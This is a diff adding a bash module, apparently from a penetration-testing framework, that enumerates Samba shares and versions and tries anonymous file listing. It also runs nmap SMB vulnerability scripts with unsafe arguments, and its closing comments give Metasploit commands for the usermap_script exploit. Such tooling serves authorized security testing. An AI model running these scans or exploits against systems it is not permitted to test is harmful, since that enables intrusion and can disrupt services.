@@ -1,0 +1,41 @@
+#!/bin/bash
+
+. "${repository_root}/yaes/modules/common-utils"
+
+#determined_ports=$( cat ${ports_file} | egrep "137|138|139|445" | egrep -o "[0-9]*" | tr '\n' ',' | sed 's/,$//g' )
+function enumerate_samba
+{
+  port=${1}
+  if [[ ${samba_enum} -eq 0 ]]
+  then
+
+    samba_enum=1
+    samba_services=1
+    decho_green "enumerating samba..."
+    nmblookup -A $( get_target_ip ) 2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null  # &> ${logs_path}/${target}/samba.log
+    nbtscan -r $( get_target_ip )   2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null    #&>> ${logs_path}/${target}/samba.log
+    samba_version=$( smbclient -NL ${target} -p ${port} | egrep -o "Samba [0-9.]+" | sort | uniq | head -n1)
+    if [[ ! -z "${samba_version// }" ]]
+    then
+      decho "enumerated samba version: ${samba_version}" 2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null          # &>> ${logs_path}/${target}/samba.log
+    else
+      decho_green "could not determine samba version, this could mean it's old one (2.2.x) and could be vulnerable to trans2open and such!"
+    fi
+    smbclient -N -L ${target} -p ${port}  2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null           # &>> ${samba_logs}/${target}.tcp.${port}.smbclient &
+    decho_green "trying to list files from shares without logging..."
+    for share in $( smbclient -NL ${target} -p ${port} | grep Disk | awk ' { print $1 } ' )
+    do
+      smbclient -N -p ${port} //${target}/${share} -c ls 2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null           #&>> ${logs_path}/${target}/samba.log
+    done
+
+    nmap --script=smb-enum* --script-args=unsafe=1 -T3 ${target} 2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null            #&>> ${logs_path}/${target}/samba.log
+    decho "quick enumerate samba vulns..."
+    nmap --script=smb-vuln* --script-args=unsafe=1 -T3 ${target} 2>&1 | tee -a ${samba_logfile} ${raw_logfile} > /dev/null           #&>> ${logs_path}/${target}/samba.log
+  else
+    decho_red "samba already enumerated on other port..."
+  fi
+}
+
+# metasploit
+# msfconsole; use scanner/smb/smb_version; set RHOSTS $ip; run
+# msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost $ip; run
